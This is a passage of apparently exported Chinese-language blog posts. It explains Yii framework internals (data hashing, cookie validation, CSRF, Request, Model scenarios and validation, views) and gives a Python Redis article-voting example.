function to see the supported hashing algorithms on your system. This must be the same * as the value passed to [[hashData()]] when generating the hash for the data. * @param bool $rawHash this should take the same value as when you generate the data using [[hashData()]]. * It indicates whether the hash value in the data is in binary format. If false, it means the hash value consists * of lowercase hex digits only. * hex digits will be generated. * @return string|false the real data with the hash stripped off. False if the data is tampered. * @throws InvalidConfigException when HMAC generation fails. */public function validateData($data, $key, $rawHash = false)&#123; ...&#125; 实例：12345678public function actionIndex3()&#123; $userId = 30; echo $temp = Yii::$app-&gt;security-&gt;hashData("security", "bunao"); echo "&lt;br/&gt;"; echo Yii::$app-&gt;security-&gt;validateData($temp, "bunao"); # security echo "&lt;br/&gt;";&#125; cookie 加解密Yii写读cookie的时候使用12345678910111213141516171819202122232425262728293031323334353637383940414243在cookie的时候会对cookie数据进行加密 yii/web/Response /** * 发送cookie * Sends the cookies to the client. */protected function sendCookies()&#123; ... ... // 加密存入cookie foreach ($this-&gt;getCookies() as $cookie) &#123; $value = $cookie-&gt;value; if ($cookie-&gt;expire != 1 &amp;&amp; isset($validationKey)) &#123; $value = Yii::$app-&gt;getSecurity()-&gt;hashData(serialize([$cookie-&gt;name, $value]), $validationKey); &#125; setcookie($cookie-&gt;name, $value, $cookie-&gt;expire, $cookie-&gt;path, $cookie-&gt;domain, $cookie-&gt;secure, $cookie-&gt;httpOnly); &#125;&#125;获取cookie的时候对其进行解密 yii/web/Request/** * 获取cookie并转换 * Converts `$_COOKIE` into an array of [[Cookie]]. * @return array the cookies obtained from request * @throws InvalidConfigException if [[cookieValidationKey]] is not set when [[enableCookieValidation]] is true */protected function loadCookies()&#123; ... ... // 验证后获取源数据 $data = Yii::$app-&gt;getSecurity()-&gt;validateData($value, $this-&gt;cookieValidationKey); if ($data === false) &#123; continue; &#125; ... ...&#125; 生成随机字符generateRandomKey &amp; generateRandomString两个都是随机一串字符，但是 generateRandomKey 生成的不是Ascii码，所以在显示的时候有可能乱码，而 generateRandomString 是对 generateRandomKey 的封装，加了 base64_encode 使其不会乱码生成指定长度随机字符，可能不是 ASCII字符，显示的时候会出现乱码12345678910111213141516/** * 生成随机key。 * 和 generateRandomString 的区别就是输出的可能不是 Ascii码的 * Generates specified number of random bytes. * Note that output may not be ASCII. * @see generateRandomString() if you need a string. * * @param int $length the number of bytes to generate 生成的长度 * @return string the generated random bytes * @throws InvalidParamException if wrong length is specified * @throws Exception on failure. */public function generateRandomKey($length = 32)&#123; ...&#125; 生成指定长度随机字符12345678910111213/** * 生成指定长度的随机字符串 * Generates a random string of specified length. * The string generated matches [A-Za-z0-9_-]+ and is transparent to URL-encoding. * * @param int $length the length of the key in characters 生成字符的长度 * @return string the generated random key * @throws Exception on failure. */public function generateRandomString($length = 32)&#123; ...&#125;]]></content>
      <categories>
        <category>yii</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>加解密</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis实现文章根据点赞及时间排序]]></title>
    <url>%2F2018%2F10%2F07%2Fredis%2Fredis%E5%AE%9E%E7%8E%B0%E6%96%87%E7%AB%A0%E6%A0%B9%E6%8D%AE%E7%82%B9%E8%B5%9E%E5%8F%8A%E6%97%B6%E9%97%B4%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[redis教程和命令redis教程和命令Redis 命令参考 需求： 根据对文章的点赞数来计算文章受欢迎程度，假设一篇文章至少需要200个赞才算有趣的文章，有趣的文章要求保留在列表前排至少 1 天 对文章进行分组，文章分值排序同样作用与一个组内的文章 思路：实现文章评分：因为要实现随时间流逝不断减少的分数，我们可以用文章发布时间来作为文章分数的基数，也就相对于随着时间的流逝文章的分数越低，因为后发布的分数比前发布的分数要高。根据需求需要超过200个赞的要在前排保留一天，我们可以计算出一个赞是多少分，一天的秒数86400除以200，等于432，也就是每获得一个赞将会的到432分 redis数据结构存储文章的 hash 结构数据结构 以文章 1 为例 字段 值 备注 key article:1 redis的key value redis的值，值的结构如下 标题 title learn redis 作者 poster echo-ding 发布时间 time 123456789 投票数 votes 12 根据发布时间排序文章的有序集合 zset 字段 值 备注 key time: redis的key value redis的值，值的结构如下 article:1 123456789 article:2 123456666 根据文章评分排序文章的有序集合 zset 字段 值 备注 key score: redis的key value redis的值，值的结构如下 article:1 123456789+432 article:2 123456666+432 记录文章投票人的集合 set以文章 1 为例 字段 值 备注 key voted:1 redis的key value redis的值，值的结构如下 user:1 文章分组，记录一个组内的文章 set以programming组为例 字段 值 备注 key group:programming redis的key value redis的值，值的结构如下 article:1 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128#!/usr/local/bin python3# -*-coding:utf-8-*-import redisimport time# 链接redisconn = redis.Redis(host='127.0.0.1',port=6609,db=0)# 一周的秒数ONE_WEEK_IN_SECONDS = 7 * 86400# 没个赞增加的积分数VOTE_SCORE = 432def article_vote(conn, user, article): ''' 投票函数 :param conn: redis资源 :param user: 用户 user:id :param article: 文章 article:id :return: ''' cutoff = time.time() - ONE_WEEK_IN_SECONDS # 如果创建文章的时间，如果已经一星期之前的，则不能再点赞 if conn.zscore('time:', article) &lt; cutoff: return # 获取文章id article_id = article.partition(':')[-1] # 如果没有投票，记录对此文章投票的人，并增加积分 if conn.sadd('voted:'+article_id, user): # 增加此文章的积分数 conn.zincrby('score:', article, VOTE_SCORE) # 增加文章的点赞数 conn.hincrby(article, 'votes', 1)def post_article(conn, user, title, article_id): ''' 创建文章 :param conn: redis资源 :param user: 用户 user:id :param title: 题目 :param article_id: 文章id :return: ''' voted = 'voted:' + article_id # 把作者添加到此文章的点赞栏 conn.sadd(voted, user) # 一星期后释放此文章的点赞人 conn.expire(voted, ONE_WEEK_IN_SECONDS) now = time.time() article = 'article:' + article_id # 存储文章信息 conn.hmset(article, &#123; 'title' : title, 'poster': user, 'time' : now, 'votes' : 1, &#125;) # 存储此文章的分值 conn.zadd('score:', article, now + VOTE_SCORE) # 存储此文章的时间 conn.zadd('time:', article, now)ARTICELS_PER_PAGE = 25def get_articles(conn, page, order = 'score:'): ''' 根据分值或创建时间获取文章 :param conn: redis资源 :param page: 页码 :param order: 根据哪个有序集合获取数据，默认是分值score: :return: 文章信息列表 ''' # 计算开始 start = (page - 1)*ARTICELS_PER_PAGE # 计算结尾 end = start + ARTICELS_PER_PAGE - 1 # 获取分值排序后的 start位到end位之间的数据 ids = conn.zrevrange(order, start, end) # 存储符合的文章 articles = [] for id in ids: # 获取该文章的信息 article_data = conn.hgetall(id) article_data['id'] = id articles.append(article_data) return articlesdef add_remove_grouops(conn, article_id, to_add = [], to_remove = []): ''' 把文章添加／移除到某些组 :param conn: redis资源 :param article_id: 文章id :param to_add: 要添加的组列表 :param to_remove: 要删除的组列表 :return: ''' article = 'article:' + article_id # 要添加到的组 for group in to_add: conn.sadd('group:' + group, article) # 要移除的组 for group in to_remove: conn.srem('group:' + group, article)def get_group_articles(conn, group, page, order = 'score:'): ''' 获取组内指定页的文章 :param conn: redis资源 :param group: 组id :param page: 页码 :param order: 根据哪个排序 分值score: 或 时间time: :return: 文章列表 ''' # 存储组文章排序的key key = order + group # 查看是否已经存在，避免频繁的计算 if not conn.exists(key): # 获取 集合'group:' + group 与 有序集合 order 的交集并将结果集存储在新的有序集合 key 中 # 集合 'group:' + group 中值对应的分值为1 # aggregate = 'max' 表示取交集中分值较大的分值 conn.zinterstore(key, ['group:' + group, order], aggregate = 'max' ) conn.expire(key, 60) # 获取文章 return get_articles(conn, page, key)if __name__ == '__main__': print('main') 参考 [redis实战 Josiah L. Carlson 著 人民邮电出版社]]]></content>
      <categories>
        <category>redis实战</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-小点汇总]]></title>
    <url>%2F2018%2F07%2F03%2Fyii%2Fyii-%E5%B0%8F%E7%82%B9%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[关于异常输出在出现异常的时候，Yii的异常处理默认是要将之前的输出清空，也就是说通过 echo 或 var_dump 打印的内容将会被清掉不输出到页面，可以通过设置 ErrorHandler 类的 discardExistingOutput = false 属性来保证输出12345678910'components' =&gt; [ ... ... 'errorHandler' =&gt; [ 'errorAction' =&gt; 'site/error', 'discardExistingOutput' =&gt; false ], ... ...] 开启debug，但是前端页面关闭debug导航条我们只需要在渲染视图之前解绑debug模块注册的事件就可以12# 解绑事件Yii::$app-&gt;view-&gt;off(\yii\web\View::EVENT_END_BODY, [\yii\debug\Module::getInstance(), 'renderToolbar']);]]></content>
      <categories>
        <category>yii</category>
        <category>小点汇总</category>
      </categories>
      <tags>
        <tag>yii-小点汇总</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Request组件和Response组件]]></title>
    <url>%2F2017%2F07%2F03%2Fyii%2FRequest%E7%BB%84%E4%BB%B6%26%26Response%E7%BB%84%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[Request组件前言Request 中的方法并不难，主要是一些功能的封装罢了，原理上没有很复杂的东西。只是涉及到许多HTTP的有关知识,具体的代码分析和相关知识可以看 这里主要归纳一下使用方法，以常用的 yii\web\Request 为例 请求头请求体getHeaders() 获取请求头可以获取所有的请求头 getRawBody() 获取请求体使用了 php://input 来获取请求体，这个 php://input 有这么几个特点： php://input 是个只读流，用于获取请求体。php://input 是返回整个HTTP请求中，除去HTTP头部的全部原始内容， 而不管是什么 Content Type（或称为编码方式）。 相比较之下， $_POST 只支持 application/x-www-form-urlencoded 和 multipart/form-data-encoded 两种 Content Type 。其中前一种就是简单的HTML表单以 method=&quot;post&quot; 提交时的形式， 后一种主要是用于上传文档。因此，对于诸如 application/json 等 Content Type，这往往是在 AJAX 场景下使用， 那么使用 $_POST 得到的是空的内容，这时就必须使用 php://input 。相比较于 $HTTP_RAW_POST_DATA ， php://input 无需额外地在 php.ini 中 激活 always-populate-raw-post-data ，而且对于内存的压力也比较小。当编码方式为 multipart/form-data-encoded 时， php://input 是无效的。这种情况一般为上传文档。 这种情况可以使用传统的 $_FILES 或者 yii\web\UploadedFile 获取/判断请求方法getMethod() 获取请求的方法可以以指定 $_POST[&#39;_method&#39;] 的方式来用POST请求来模拟其他方法的请求。 getIsAjax() 是否是AJAX请求这其实不是HTTP请求方法, 需要js在写入相应的header头 HTTP_X_REQUESTED_WITH: XMLHttpRequest getIsDelete() 是否是DELETE请求getIsFlash() 是否是Adobe Flash 或 Adobe Flex 发出的请求，这其实也不是HTTP请求方法。getIsGet() 是否是一个GET请求getIsHead() 是否是一个HEAD请求getIsOptions() 是否是一个OPTIONS请求getIsPatch() 是否是PATCH请求getIsPjax() 是否是一个PJAX请求，这也并非是HTTP请求方法。getIsPost() 是否是一个POST请求getIsPut() 是否是一个PUT请求获取请求数据get($name = null, $defaultValue = null) 获取get请求的数据 如果不带参数，则表示获取所有的get参数 getQueryParams() 常用的方式，获取某个值，如果这个值不存在就给指定的默认值 getQueryParam($name, $defaultValue = null) 1get('ding', 'ding') post($name = null, $defaultValue = null) 获取post请求的数据和get用法一样 getBodyParams() 解析请求体中的数据这个方法会根据请求的 content-type 来找对应的解析类把 请求体 的数据给解析出来 getBodyParam($name = null, $defaultValue = null) 解析请求体中的数据获取getBodyParams()解析后的内容中对应的key 域名相关getHostInfo() 获取当前的域名，带协议(http或https)和端口号举例1234请求www.yiibasic.com/test/test输出http://www.yiibasic.com getHostName() 获取当前域名，只是域名12解析的 getHostInfo() 获取到的值 parse_url($this-&gt;getHostInfo(), PHP_URL_HOST) 1234请求www.yiibasic.com/test/test输出www.yiibasic.com getServerName() 也是返回域名 和 getHostName一样url相关getUrl() 返回当前请求(域名后的所有内容)如http://localhost/learn/yii/yiilearn/basic/web/index.php/test/request返回/learn/yii/yiilearn/basic/web/index.php/test/request getScriptUrl() 获取入口文件相对域名的路径，带入口文件如 www.bunao.me/web/index.php 获取到的是 /web/index.phpwww.bunao.me/index.php 和 www.bunao.me 获取到的就是 /index.php如果开启了省略入口文件，则获取到的为空 getBaseUrl() 获取入口文件相对域名的路径,不带入口文件getBaseUrl() 获取到的是对 getScriptUrl() 的处理,去掉了入口文件假设域名指向的不是 web 而是 web的外层则获取到的是 /web getAbsoluteUrl() 获取完整的当前请求1$this-&gt;getHostInfo() . $this-&gt;getUrl(); getScriptFile() 获取当前脚本的实际物理路径例如1D:/ding/wamp64/www/learn/yii/yiilearn/basic/web/index.php getPathInfo() 返回真正的 pathInfo? 问号前和入口文件之间的部分例子1234567urlwww.bunao.me/index.php/ding/ran?bunao=yes 带入口文件的情况www.bunao.me/ding/ran?bunao=yes 不带入口文件www.bunao.me/web/index.php/ding/ran?bunao=yes 带入口文件 www.bunao.me/web/ding/ran?bunao=yes 不带入口文件pathInfo ding/ran 加解密相关的getCookies() 获取cookie默认是必须用这个方法来获取cookie的，因为默认存取cookie是存取的加密数据，而这个方法获取时会对加密的数据进行解密 Csrf这里理解一下yii如何实现csrf的 生成token:在渲染页面的时候通过 getCsrfToken() 方法获取到token，嵌到页面里，参考 BaseHtml::csrfMetaTags() 方法 验证token:在请求的时候通过 validateCsrfToken() 方法来验证token，参考 Controller::beforeAction() 方法 info1: 在生成token的时候同时会保存在 cookie、session 中，验证的时候将 接口(页面)传来的数据 和正确的数据(从 cookie、session 中获取) 进行比较。也就是说csrf依赖cookie。info2: 为什么敢将token同时存在cookie？因为存cookie时候是加密的形式，所以也就不害怕了。 其他方法getQueryString() 返回url中?后的部分getIsSecureConnection() 判读不是 https请求getServerPort() 获取端口号getReferrer() 获取 ReferergetUserAgent() 获取浏览器信息，简单防爬虫getUserIP() 获取用户ipgetPort() 获取http端口号，默认是80getSecurePort() 获取https端口号，默认是443getContentType() 获取 content-typeresolve() 获取解析后的请求Application 会用它来执行解析Url请求，分析出正确的路由和参数 其他的其他getUserHost() 获取用户主机名/域名getAuthUser() http认证机制getAuthPassword() http认证密码getAcceptableContentTypes() 获取用户能够接受的content-type类型看示例吧123456789$_SERVER['HTTP_ACCEPT'] = 'text/plain; q=0.5, application/json; version=1.0, application/xml; version=2.0;';$types = $request-&gt;getAcceptableContentTypes();print_r($types);// 结果// [// 'application/json' =&gt; ['q' =&gt; 1, 'version' =&gt; '1.0'],// 'application/xml' =&gt; ['q' =&gt; 1, 'version' =&gt; '2.0'],// 'text/plain' =&gt; ['q' =&gt; 0.5],// ] parseAcceptHeader($header) 解析获取到的请求头字段，看示例123456789$header = 'text/plain; q=0.5, application/json; version=1.0, application/xml; version=2.0;';$accepts = $request-&gt;parseAcceptHeader($header);print_r($accepts);// displays:// [// 'application/json' =&gt; ['q' =&gt; 1, 'version' =&gt; '1.0'],// 'application/xml' =&gt; ['q' =&gt; 1, 'version' =&gt; '2.0'],// 'text/plain' =&gt; ['q' =&gt; 0.5],// ] getAcceptableLanguages() 获取能够接收的语言类型getPreferredLanguage(array $languages = []) 返回该应用程序应该用的首选语言getETags() 返回etags内容, 在http缓存有用使用ETags减少Web应用带宽和负载 参考深入理解yii-Request(完全参考) Response组件前言我觉得官网上的已经很清晰够用了，代码也比较简单。直接看 官网]]></content>
      <categories>
        <category>yii</category>
        <category>请求和响应组件</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>Response</tag>
        <tag>Request</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-model]]></title>
    <url>%2F2017%2F07%2F03%2Fyii%2F%E6%A8%A1%E5%9E%8B%E7%B1%BB-Model%2F</url>
    <content type="text"><![CDATA[前言简单的接收数据的表单，使用继承自 Model 类的模型即可，如果是需要增删改之类的牵扯到表的则用 Active Record 活动记录(也是继承自 Model) 下面所述，字段和属性一个意思 像数组一样访问和遍历模型可像访问数组单元项一样访问属性，这要感谢 yii\base\Model 支持 ArrayAccess 数组访问参考链接 和 ArrayIterator 数组迭代器参考链接:1234567891011121314public function actionModel()&#123; $model = new TestForm; // 显示所有的公有属性 var_dump($model-&gt;attributes); // yii\base\Model 支持 ArrayAccess 数组访问 可以像访问数组但愿项一样访问属性 $model['name'] = 'example'; echo $model['name']; // Model 支持 ArrayIterator 数组迭代器，迭代器遍历模型，访问所有的公有属性 foreach ($model as $name =&gt; $value) &#123; echo "$name: $value\n"; &#125;&#125; 属性标签属性标签多用在小部件展示字段的时候显示的字段名，默认情况下，属性标签通过 yii\base\Model::generateAttributeLabel() 方法自动从属性名生成. 它会自动将驼峰式大小写变量名转换为多个首字母大写的单词， 例如 username 转换为 Username ， firstName 转换为 First Name。 获取属性标签获取 name 字段的属性标签1$model-&gt;getAttributeLabel('name'); 手动设置属性标签自定义属性标签123456public function attributeLabels()&#123; return [ 'name' =&gt; 'Your name', ];&#125; 场景一个模型可以根据不同的场景所支持的字段来执行对应的验证或块赋值，从而实现一个Model对应可以对应多个不同业务。 例如 User 模块可能会在收集用户登录输入， 也可能会在用户注册时使用。在不同的场景下， 模型可能会使用不同的业务规则和逻辑， 例如 email 属性在注册时强制要求有，但在登陆时不需要。 定义场景默认情况下，模型支持一个名为 default 的场景 方式一：在场景 scenarios() 方法中定义12345678910111213class User extends ActiveRecord&#123; const SCENARIO_LOGIN = 'login'; const SCENARIO_REGISTER = 'register'; //定义场景 public function scenarios() &#123; return [ self::SCENARIO_LOGIN =&gt; ['username', 'password'], self::SCENARIO_REGISTER =&gt; ['username', 'email', 'password'], ]; &#125;&#125; 方式二：在规则 rolus() 方法中定义直接在规则 rolus() 方法中 使用 on 来指定场景，没使用 on 将 用在所有场景中 这里的所有场景是指规则中所有通过 on 或 except 定义的场景 使用规则如下，请按照顺序 如果 on 没有指定场景，这条规则上的字段将会添加到所有的场景 如果 on 没有指定场景，而使用 except 指定场景，那么这条规则上的字段将作用于除了 except 指定场景外的所有场景 如果 on 指定了场景，那这条规则上的字段就将会使用所指定的场景 12345678910public function rules()&#123; return [ // 在"register" 场景下 username, email 和 password 必须有值 [['username', 'email', 'password'], 'required', 'on' =&gt; 'register'], // 在 "login" 场景下 username 和 password 必须有值 [['username', 'password'], 'required', 'on' =&gt; 'login'], ];&#125; 两种方式定义规则方式的区别其实两种方式是一样的，第一种方式更加清楚一些，而第二种方法更加灵活一些。我们看一下第二种是怎么实现的。其实就是将规则 rules 中定义的场景提取出来123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566public function scenarios()&#123; // 默认场景 $scenarios = [self::SCENARIO_DEFAULT =&gt; []]; // 遍历rules定义的所有的验证器 foreach ($this-&gt;getValidators() as $validator) &#123; // rule数组中定义的场景 on=&gt;scenario foreach ($validator-&gt;on as $scenario) &#123; $scenarios[$scenario] = []; &#125; // 验证规则中除去某个场景都验证的情况 except=&gt;scenario foreach ($validator-&gt;except as $scenario) &#123; $scenarios[$scenario] = []; &#125; &#125; // 获取所有的场景 $names = array_keys($scenarios); // 将字段添加到对应的场景中 foreach ($this-&gt;getValidators() as $validator) &#123; // 如果 某个 rule 中没有定义场景 // 表示这个rule中所有的字段用在所有的场景中 if (empty($validator-&gt;on) &amp;&amp; empty($validator-&gt;except)) &#123; foreach ($names as $name) &#123; foreach ($validator-&gt;attributes as $attribute) &#123; $scenarios[$name][$attribute] = true; &#125; &#125; // 如果 rule 没有定义使用的场景 on &#125; elseif (empty($validator-&gt;on)) &#123; foreach ($names as $name) &#123; // 如果不在定义的排除 except 的场景 if (!in_array($name, $validator-&gt;except, true)) &#123; foreach ($validator-&gt;attributes as $attribute) &#123; $scenarios[$name][$attribute] = true; &#125; &#125; &#125; // 如果定义了使用的场景 on &#125; else &#123; foreach ($validator-&gt;on as $name) &#123; foreach ($validator-&gt;attributes as $attribute) &#123; $scenarios[$name][$attribute] = true; &#125; &#125; &#125; &#125; // 除去没用到的场景 foreach ($scenarios as $scenario =&gt; $attributes) &#123; if (!empty($attributes)) &#123; $scenarios[$scenario] = array_keys($attributes); &#125; &#125; return $scenarios;&#125;``` ### 使用场景 如下展示两种设置场景的方法:```php// 场景作为属性来设置$model-&gt;scenario = 'login';// 场景通过构造初始化配置来设置$model = new Model(['scenario' =&gt; 'login']); 验证规则为什么写在场景之后，因为用到场景啊 示例先看一下下面的内容，之后我们在分析原理，内容来自官方文档 当模型接收到终端用户输入的数据，数据应当满足某种规则(称为 验证规则, 也称为 业务规则)。 可调用 yii\base\Model::validate() 来验证接收到的数据， 该方法使用 yii\base\Model::rules() 申明的验证规则来验证每个相关属性， 如果没有找到错误，会返回 true， 否则它会将错误保存在 yii\base\Model::errors 属性中并返回 false ，例如：1234567891011$model = new \app\models\ContactForm;// 用户输入数据赋值到模型属性$model-&gt;attributes = \Yii::$app-&gt;request-&gt;post('ContactForm');// 验证数据if ($model-&gt;validate()) &#123; // 所有输入数据都有效 all inputs are valid&#125; else &#123; // 验证失败：$errors 是一个包含错误信息的数组 $errors = $model-&gt;errors;&#125; 通过覆盖 yii\base\Model::rules() 方法指定 模型属性应该满足的规则来申明模型相关验证规则。 下述例子显示ContactForm模型申明的验证规则:12345678910public function rules()&#123; return [ // name, email, subject 和 body 属性必须有值 [['name', 'email', 'subject', 'body'], 'required'], // email 属性必须是一个有效的电子邮箱地址 ['email', 'email'], ];&#125; 一条规则可用来验证一个或多个属性，一个属性可对应一条或多条规则。 有时你想一条规则只在某个 场景 下应用， 为此你可以指定规则的 on 属性，如下所示:12345678910public function rules()&#123; return [ // 在"register" 场景下 username, email 和 password 必须有值 [['username', 'email', 'password'], 'required', 'on' =&gt; 'register'], // 在 "login" 场景下 username 和 password 必须有值 [['username', 'password'], 'required', 'on' =&gt; 'login'], ];&#125; 如果没有指定 on 属性，规则会在所有场景下应用， 在当前 yii\base\Model::scenario 下应用的规则称之为 active rule活动规则。 一个属性只会属于scenarios()中定义的活动属性且在 rules() 申明对应一条或多条活动规则的情况下被验证。 原理根据 rules 中定义的规则生成验证器，然后在根据场景来获取到需要验证的字段进行验证 使用rules 配置下面随便写几条规则理解一下1234567891011121314151617181920212223242526public function rules()&#123; return [ // 在"register" 场景下 username, email 和 password 必须有值 [['username', 'email', 'password'], 'required', 'on' =&gt; 'register'], // 验证之前会先执行 when 定义的匿名函数，如果返回的true才往后进行验证。 参数：(当前模型对象, 验证的属性) [['username', 'email', 'password'], 'required', 'when' =&gt; function ($model, $attribute)&#123;&#125;], // 通过匿名函数进行校验 参数：(验证的属性, 规则中定义的params, InlineValidator对象) [['username', 'email', 'password'], function ($attribute, $params, $validator)&#123;&#125;, 'params' =&gt; ['a', 'b']], // 使用当前model中的 myValidator() 方法进行验证 [['username', 'email', 'password'], 'myValidator'], // 除了 register 场景,其他场景 username 和 password 必须有值; skipOnError = false 时，如果之前的验证器出现验证错误，该验证器依旧进行验证; message 配置自定义的错误信息 [['!username', 'password'], 'required', 'except' =&gt; 'register', 'skipOnError' =&gt; false, 'message' =&gt; 'Please choose a username.'], ];&#125;``` &gt; 以 !开头的属性为 非安全属性(只验证，不赋值) #### yii自定义的验证器了解一下 `yii\validators\Validator` 类中定义了一些常用的验证器，去了解一下 ### 相关方法 #### 返回当前场景需要验证的字段 ```php# 返回当前场景需要验证的字段，包括以 !开头的 非安全属性(只验证，不赋值) activeAttributes() 返回当前场景 所有/某字段 有效的验证器123# 如果 $attribute = null 返回当前场景有效的验证器# 如果 $attribute = 字段值 返回 该字段 在当前场景下所有的验证器 getActiveValidators($attribute = null) 验证 validate默认验证所有需要验证的字段，可以指定验证的字段12# 如果传 $attributeNames = ['字段1', '字段2'] 将会只验证这两个字段 validate($attributeNames = null, $clearErrors = true) 关于验证器的属性配置在验证属性的时候用到了验证器的两个属性 skipOnError 和 skipOnEmpty , 分别表示当如果之前的验证器已经有错误是否跳过和该字段值为空时是否跳过验证。跳过验证后将不会进行验证，也就不发获取到全部的验证错误信息 如果需要获取所有的验证错误信息，需要在配置 rules 时将 skipOnError 配置上去，值为 false 几个和error相关的方法1234567891011121314# 给属性添加错误信息，一般自定义验证方法的时候会用到 addError($attribute, $error = '')# 上面的复数形式 addErrors(array $items)# 获取 所有/指定的属性 是否有验证错误 hasErrors($attribute = null)# 获取 所有/指定的属性 的验证错误信息 getErrors($attribute = null)# 清除 所有/指定的属性 的验证错误信息 clearErrors($attribute = null)# 获取该属性的第一个错误信息 getFirstError($attribute)# 获取所有属性的第一个错误信息getFirstErrors() 临时验证有时，你需要对某些没有绑定任何模型类的值进行 临时验证。 若你只需要进行一种类型的验证 (e.g. 验证邮箱地址)，你可以调用所需验证器的 `validate()`` 方法。像这样：12345678$email = 'test@example.com';$validator = new yii\validators\EmailValidator();if ($validator-&gt;validate($email, $error)) &#123; echo '有效的 Email 地址。';&#125; else &#123; echo $error;&#125; 块赋值setAttributes() 块赋值块赋值只用一行代码将用户所有输入填充到一个模型，非常方便， 它直接将输入数据对应填充到 yii\base\Model::attributes() 属性。 以下两段代码效果是相同的， 都是将终端用户输入的表单数据赋值到 ContactForm 模型的属性， 明显地前一段块赋值的代码比后一段代码简洁且不易出错。123456789$model = new \app\models\ContactForm;$model-&gt;attributes = \Yii::$app-&gt;request-&gt;post('ContactForm');$model = new \app\models\ContactForm;$data = \Yii::$app-&gt;request-&gt;post('ContactForm', []);$model-&gt;name = isset($data['name']) ? $data['name'] : null;$model-&gt;email = isset($data['email']) ? $data['email'] : null;$model-&gt;subject = isset($data['subject']) ? $data['subject'] : null;$model-&gt;body = isset($data['body']) ? $data['body'] : null; 块赋值调用的是 setAttributes($values, $safeOnly = true) 方法，第二个参数默认为 true ,表示需要 rolus() 方法在声明了的字段(属性)且字段前面没有 ! 才给赋值(赋值，并验证)，改为 false 表示只要对应的有这个属性(字段)，就给赋值 load() 表单块赋值通过表单上传的数据通常是通过 load 进行块赋值的(前端用到表单小部件的情况，因为表单小部件默认会在表单提交的name属性值带上 $model-&gt;formName() 来对应该模型)。当然也可以手动指定 $formName 值为自定义的值123456789101112131415161718public function load($data, $formName = null)&#123; // form表名 $scope = $formName === null ? $this-&gt;formName() : $formName; // 如果没有表单名 if ($scope === '' &amp;&amp; !empty($data)) &#123; $this-&gt;setAttributes($data); return true; // 如果有表名，获取表单名下的数据 // 获取提交的类名下的数据 &#125; elseif (isset($data[$scope])) &#123; $this-&gt;setAttributes($data[$scope]); return true; &#125; return false;&#125; 哈哈，其实还是用的 setAttributes() 嘛，就是用表单小部件的时候用这个方便 数据导出 toArray()其实这个应该放在 restful 和 AR模型 是分析的，这里先简单看一下用法下面都是官网的 默认情况下，字段名对应属性名，但是你可以通过覆盖 fields() 和/或 extraFields() 方法来改变这种行为， 两个方法都返回一个字段定义列表，fields() 方法定义的字段是默认字段， 表示 toArray() 方法默认会返回这些字段。 extraFields() 方法定义额外可用字段， 通过toArray()方法指定$expand参数来返回这些额外可用字段。 例如如下代码会返回fields()方法定义的所有字段和extraFields()方法定义的prettyName and fullAddress字段。12// toArray(array $fields = [], array $expand = [], $recursive = true) 方法参数$array = $model-&gt;toArray([], ['prettyName', 'fullAddress']); 可通过覆盖 fields() 来增加、删除、重命名和重定义字段， fields() 方法返回值应为数组， 数组的键为字段名，数组的值为对应的可为属性名或匿名函数返回的字段定义对应的值。 特使情况下，如果字段名和属性定义名相同，可以省略数组键， 例如：1234567891011121314151617181920212223242526272829// 明确列出每个字段，特别用于你想确保数据表或模型// 属性改变不会导致你的字段改变(保证后端的API兼容)。public function fields()&#123; return [ // 字段名和属性名相同 'id', // 字段名为 "email"，对应属性名为 "email_address" 'email' =&gt; 'email_address', // 字段名为 "name", 值通过PHP代码返回 'name' =&gt; function () &#123; return $this-&gt;first_name . ' ' . $this-&gt;last_name; &#125;, ];&#125;// 过滤掉一些字段，特别用于// 你想继承父类实现并不想用一些敏感字段public function fields()&#123; $fields = parent::fields(); // 去掉一些包含敏感信息的字段 unset($fields['auth_key'], $fields['password_hash'], $fields['password_reset_token']); return $fields;&#125; 警告： 由于模型的所有属性会被包含在导出数组，最好检查数据确保没包含敏感数据， 如果有敏感数据，应覆盖 fields() 方法过滤掉， 在上述列子中，我们选择过滤掉 auth_key, password_hash and password_reset_token]]></content>
      <categories>
        <category>yii</category>
        <category>model</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>model</tag>
        <tag>验证器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-view]]></title>
    <url>%2F2017%2F07%2F03%2Fyii%2F%E8%A7%86%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[View组件前言视图层是以 View组件 为主体，通过小部件、主题、国际化、模板渲染 进行扩展，由于通过服务定位器的方式获取到的 view对象 ，所以整个周期中所用的 view 是同一个对象, 当然你也可以单独创建。 数据传递 通过控制器的 render() 方法传递给视图层 在视图层通过 $this-&gt;context 来获取所对应的控制器对象，可以访问对象中的属性值 在 控制器 controller 中 使用 $this-&gt;view-&gt;params[&#39;menu&#39;] ;在布局(其他视图)中可以使用 $this-&gt;params[&#39;menu&#39;] 访问; 例如：12345678index.php 视图文件&lt;?php$this-&gt;params['ding']='ran' ?&gt;layout 布局文件&lt;?phpecho $this-&gt;params['ding']; ?&gt; 渲染视图相关在讲控制器的时候我们已经讲到控制器中调用的渲染视图的方法，最终都是调用view中的方法，具体的用法已经说过了，可以回去看一下。没什么难点，就是根据规则找到视图路径，然后进行加载。 注册前端资源&amp;&amp;注册标签使用注册资源的前提注册资源就是将前端资源(css、js)注册到视图中相应的位。比如通过 registerCssFile() 方法来注册一个css文件，如何实现的呢？我们要从布局文件中发现他的秘密。看一下自带视图文件:12345678910111213141516171819202122232425&lt;?phpuse yii\helpers\Html;/* @var $this yii\web\View *//* @var $content string 字符串 */?&gt;&lt;?php $this-&gt;beginPage() ?&gt;&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"/&gt; # 